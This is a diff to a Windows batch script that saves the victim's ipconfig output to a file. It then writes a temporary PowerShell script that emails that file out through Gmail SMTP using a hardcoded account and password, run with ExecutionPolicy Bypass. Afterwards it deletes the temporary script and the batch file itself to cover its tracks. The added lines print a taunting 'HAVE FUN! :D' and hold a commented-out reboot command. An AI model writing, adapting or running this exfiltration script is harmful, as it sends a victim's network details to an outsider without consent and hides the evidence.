@@ -4,13 +4,18 @@ ipconfig > C:\Users\%username%\ipinfo.txt
 SET GmailAccount=projdatatests@gmail.com
 SET GmailPassword=C0D!N6PR0J3CT5
 SET Attachment=C:\Users\%username%\ipinfo.txt
+SET PShellScript=%temp%\sendEmail.ps1
 
 CALL :PowerShellScriptCreate
 CD %PowerShellDir%
 Powershell -ExecutionPolicy Bypass -Command "& {%PShellScript% '%GmailAccount%' '%GmailPassword%' '%Attachment%'}"
+@echo on
+echo HAVE FUN! :D
+@echo off
+TIMEOUT /T 5
 IF EXIST "%PShellScript%" DEL /Q /F "%PShellScript%"
 IF EXIST "%~FN0" DEL /Q /F "%~FN0"
-pause
+REM shutdown /r
 
 :PowerShellScriptCreate
 SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
@@ -32,5 +37,3 @@ ECHO $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username
 ECHO $SMTPClient.Send($SMTPMessage^)
 ) > %PShellScript%
 GOTO :EOF
-
-
